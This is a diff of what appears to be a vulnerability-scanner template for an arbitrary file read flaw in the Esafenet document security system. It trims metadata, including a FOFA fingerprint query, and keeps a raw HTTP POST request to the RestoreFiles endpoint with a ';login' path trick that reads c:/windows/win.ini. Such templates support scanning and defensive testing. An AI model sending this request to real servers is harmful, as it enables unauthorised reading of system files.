@@ -3,20 +3,14 @@ info:
   name: 亿赛通电子文档安全管理系统 RestoreFiles 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rryqmrds0ut17nx5'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rryqmrds0ut17nx5
-    fofa: body="/CDGServer3/index.jsp"
 http:
 - raw:
   - 'POST /CDGServer3/document/RestoreFiles;login HTTP/1.1
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     command=DownloadDoc&fileNameForDownload=&downPath=c:/windows/win.ini
